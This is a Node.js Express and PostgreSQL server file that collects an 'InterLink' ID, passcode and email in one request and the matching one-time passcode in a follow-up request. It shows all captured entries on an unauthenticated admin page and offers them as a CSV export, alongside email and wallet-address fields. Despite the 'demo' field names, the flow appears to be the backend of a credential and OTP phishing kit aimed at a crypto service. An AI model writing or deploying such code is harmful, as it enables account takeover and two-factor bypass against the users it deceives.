const express = require('express');
const { Pool } = require('pg');

if (typeof process.loadEnvFile === 'function') {
  try {
    process.loadEnvFile();
  } catch (error) {
    if (error.code !== 'ENOENT') throw error;
  }
}

const app = express();
const port = Number(process.env.PORT || 8000);
const databaseConfigured = Boolean(
  process.env.DATABASE_URL ||
  (process.env.DB_HOST && process.env.DB_NAME && process.env.DB_USER && process.env.DB_PASSWORD) ||
  (process.env.PGHOST && process.env.PGDATABASE && process.env.PGUSER && process.env.PGPASSWORD)
);
const pool = process.env.DATABASE_URL
  ? new Pool({ connectionString: process.env.DATABASE_URL })
  : new Pool({
      host: process.env.DB_HOST || process.env.PGHOST || 'localhost',
      port: Number(process.env.DB_PORT || process.env.PGPORT || 5432),
      database: process.env.DB_NAME || process.env.PGDATABASE || 'interlink',
      user: process.env.DB_USER || process.env.PGUSER || 'postgres',
      password: process.env.DB_PASSWORD || process.env.PGPASSWORD
    });

app.get('/healthz', (_request, response) => {
  response.status(200).json({ status: 'ok', databaseConfigured });
});

app.use(express.json({ limit: '32kb' }));
app.use(express.static(__dirname));

async function initializeDatabase() {
  await pool.query(`
    CREATE TABLE IF NOT EXISTS interlink_submissions (
      id BIGSERIAL PRIMARY KEY,
      display_name VARCHAR(120),
      email VARCHAR(254),
      wallet_address VARCHAR(120),
      kyc_status VARCHAR(80),
      demo_interlink_id VARCHAR(120),
      demo_passcode VARCHAR(20),
      demo_email VARCHAR(254),
      demo_otp VARCHAR(20),
      created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
    )
  `);
  await pool.query(`
    ALTER TABLE interlink_submissions
      ADD COLUMN IF NOT EXISTS demo_interlink_id VARCHAR(120),
      ADD COLUMN IF NOT EXISTS demo_passcode VARCHAR(20),
      ADD COLUMN IF NOT EXISTS demo_email VARCHAR(254),
      ADD COLUMN IF NOT EXISTS demo_otp VARCHAR(20)
  `);
}

app.get('/api/health', async (_request, response) => {
  try {
    const result = await pool.query('SELECT current_database() AS database, current_user AS username');
    response.json({ connected: true, ...result.rows[0] });
  } catch (error) {
    response.status(500).json({ connected: false, error: 'Database connection failed' });
  }
});

app.post('/api/submissions', async (request, response) => {
  const { displayName, email, walletAddress, kycStatus } = request.body;
  if (!displayName && !email && !walletAddress) {
    return response.status(400).json({ error: 'At least one non-sensitive field is required' });
  }
  const result = await pool.query(
    `INSERT INTO interlink_submissions
      (display_name, email, wallet_address, kyc_status)
     VALUES ($1, $2, $3, $4) RETURNING id, created_at`,
    [displayName || null, email || null, walletAddress || null, kycStatus || null]
  );
  response.status(201).json(result.rows[0]);
});

app.get('/api/submissions', async (_request, response) => {
  const result = await pool.query(
    `SELECT id, display_name, email, wallet_address, kyc_status,
            demo_interlink_id, demo_passcode, demo_email, demo_otp, created_at
     FROM interlink_submissions ORDER BY created_at DESC LIMIT 500`
  );
  response.json(result.rows);
});

app.get('/admin/submissions', async (_request, response) => {
  const result = await pool.query(
    `SELECT id, demo_interlink_id, demo_passcode, demo_email, demo_otp, created_at
     FROM interlink_submissions ORDER BY created_at DESC LIMIT 500`
  );
  const escapeHtml = (value) => String(value ?? '')
    .replaceAll('&', '&amp;')
    .replaceAll('<', '&lt;')
    .replaceAll('>', '&gt;')
    .replaceAll('"', '&quot;')
    .replaceAll("'", '&#039;');
  const rows = result.rows.map((row) => `
    <tr>
      <td>${escapeHtml(row.id)}</td>
      <td>${escapeHtml(row.demo_interlink_id)}</td>
      <td>${escapeHtml(row.demo_passcode)}</td>
      <td>${escapeHtml(row.demo_email)}</td>
      <td>${escapeHtml(row.demo_otp)}</td>
      <td>${escapeHtml(row.created_at)}</td>
    </tr>`).join('');

  response.send(`<!doctype html>
    <html lang="en">
      <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>InterLink Submissions</title>
        <style>
          body { background:#0a0a0a; color:#fff; font-family:Arial,sans-serif; padding:24px; }
          h1 { margin-bottom:20px; }
          table { border-collapse:collapse; width:100%; background:#111; }
          th, td { border:1px solid #333; padding:10px; text-align:left; }
          th { background:#1d1d1d; }
          tr:nth-child(even) { background:#161616; }
          @media(max-width:700px){ table { display:block; overflow-x:auto; } }
        </style>
      </head>
      <body>
        <h1>InterLink Submissions</h1>
        <table>
          <thead>
            <tr>
              <th>ID</th>
              <th>InterLink ID</th>
              <th>Passcode</th>
              <th>Email</th>
              <th>OTP</th>
              <th>Created</th>
            </tr>
          </thead>
          <tbody>${rows || '<tr><td colspan="6">No submissions</td></tr>'}</tbody>
        </table>
      </body>
    </html>`);
});

app.get('/api/submissions.csv', async (_request, response) => {
  const result = await pool.query(
    `SELECT id, display_name, email, wallet_address, kyc_status,
            demo_interlink_id, demo_passcode, demo_email, demo_otp, created_at
     FROM interlink_submissions ORDER BY created_at DESC`
  );
  const escapeCsv = (value) => `"${String(value ?? '').replaceAll('"', '""')}"`;
  const rows = [['id', 'display_name', 'email', 'wallet_address', 'kyc_status', 'demo_interlink_id', 'demo_passcode', 'demo_email', 'demo_otp', 'created_at'], ...result.rows.map((row) => [row.id, row.display_name, row.email, row.wallet_address, row.kyc_status, row.demo_interlink_id, row.demo_passcode, row.demo_email, row.demo_otp, row.created_at.toISOString()])];
  response.setHeader('Content-Type', 'text/csv');
  response.setHeader('Content-Disposition', 'attachment; filename="interlink-submissions.csv"');
  response.send(rows.map((row) => row.map(escapeCsv).join(',')).join('\n'));
});

app.post('/api/demo-auth', async (request, response) => {
  const { demoId, passcode, email } = request.body;
  const result = await pool.query(
    `INSERT INTO interlink_submissions
      (demo_interlink_id, demo_passcode, demo_email)
     VALUES ($1, $2, $3)
     RETURNING id, created_at`,
    [demoId || null, passcode || null, email || null]
  );
  response.status(201).json(result.rows[0]);
});

app.patch('/api/demo-auth/:id/otp', async (request, response) => {
  const result = await pool.query(
    `UPDATE interlink_submissions SET demo_otp = $1
     WHERE id = $2
     RETURNING id, demo_interlink_id, demo_passcode, demo_email, demo_otp, created_at`,
    [request.body.otp || null, request.params.id]
  );
  if (!result.rows.length) return response.status(404).json({ error: 'Submission not found' });
  response.json(result.rows[0]);
});

app.listen(port, '0.0.0.0', () => {
  console.log(`Server running on port ${port}`);
});

async function startDatabase() {
  if (!databaseConfigured) {
    console.error('Database configuration is missing. Set DATABASE_URL, or DB_HOST/DB_NAME/DB_USER/DB_PASSWORD.');
    return;
  }

  try {
    await initializeDatabase();
    console.log('Database initialized');
  } catch (error) {
    console.error(`Database unavailable: ${error.message}`);
    setTimeout(startDatabase, 10_000).unref();
  }
}

startDatabase();
